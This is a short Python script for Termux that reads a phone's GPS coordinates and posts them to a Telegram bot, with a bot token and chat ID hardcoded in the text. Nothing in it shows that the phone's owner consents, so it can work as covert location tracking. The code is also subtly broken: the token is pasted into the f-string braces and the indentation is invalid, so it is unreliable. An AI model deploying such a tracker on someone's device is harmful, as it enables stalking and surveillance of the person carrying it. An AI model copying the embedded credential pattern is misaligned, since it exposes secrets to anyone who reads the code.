import json, subprocess, requests
   TOKEN = "8976562709:AAF_VV_DNzGwREHD-MdKEY49bHphGFzz5XA"; CHAT_ID = "8450380865"
   out = subprocess.check_output(["termux-location","-p","gps"]).decode()
   data = json.loads(out); lat, lon = data["latitude"], data["longitude"]
   url = f"https://api.telegram.org/bot{8976562709:AAF_VV_DNzGwREHD-MdKEY49bHphGFzz5XA}/sendLocation"
   requests.post(url, data={"chat_id": 8450380865, "latitude": lat, "longitude": lon})